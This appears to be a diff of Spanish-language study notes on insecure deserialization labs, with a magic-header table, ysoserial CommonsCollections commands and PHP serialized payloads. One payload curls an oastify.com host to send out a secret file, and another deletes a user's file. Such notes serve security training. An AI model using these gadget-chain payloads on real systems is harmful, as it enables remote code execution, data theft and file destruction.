@@ -4,14 +4,31 @@
 
 COOKIE MUY LARGA --> OJOOOOOO!!
 
+
+# ⚠️⚠️⚠️
+
 | Object Type     | Header (Hex) | Header (Base64) |
 | --------------- | ------------ | --------------- |
-| Java Serialized | AC ED        | rO              |
+| Java Serialized | AC ED        | rO...           |
 | .NET ViewState  | FF 01        | /w              |
 | Python Pickle   | 80 04 95     | gASV            |
 | PHP Serialized  | 4F 3A        | Tz              |
 
+# ⚠️⚠️⚠️
 CommonsCollections7 'curl https://j5ppeqf3n37txn28onrhlmku3l9cx5lu.oastify.com -d @/home/carlos/secret'
+
+5. Apache Commons:
+	1. Las cookies de Java comienzan por **'rOO...'**
+	2. Descargamos el YSOSERIAL.jar : https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
+	3. Probamos payloads con los distintos CommonsCollections{1,2,3,4}
+```bash
+java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0; echo
+```
+	4. Cuando tenemos el que queremos lo pegamos y copiamos el de arriba para el formato URL-Encode
+
+![[Pasted image 20260727142904.png]]
+
+
 # Importante: ⚠️
 
 Para reconocer posibles puntos de entrada para su exploit, busque firmas que tengan todos los objetos serializados de Java:
@@ -26,7 +43,7 @@ Para reconocer posibles puntos de entrada para su exploit, busque firmas que ten
 import os
 
 burp_collab_link = "<COLLABORATOR-URL>"
-jar_filename = "ysoserial-all.jar"
+jar_filename = "ysoserial.jar"
 filename = "exploitsInBase64.txt"
 open(filename, 'w').close()
 
@@ -120,18 +137,6 @@ O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dvt6huggv1p5
 ```php
 O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 ```
-
-5. Apache Commons:
-	1. Las cookies de Java comienzan por **'rOO...'**
-	2. Descargamos el YSOSERIAL.jar : https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
-	3. Probamos payloads con los distintos CommonsCollections{1,2,3,4}
-```bash
-java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0;
- echo
-```
-	4. Cuando tenemos el que queremos lo pegamos y copiamos el de arriba para el formato URL-Encode
-
-![[Pasted image 20260727142904.png]]
 
 6. PHP deserialization:
 
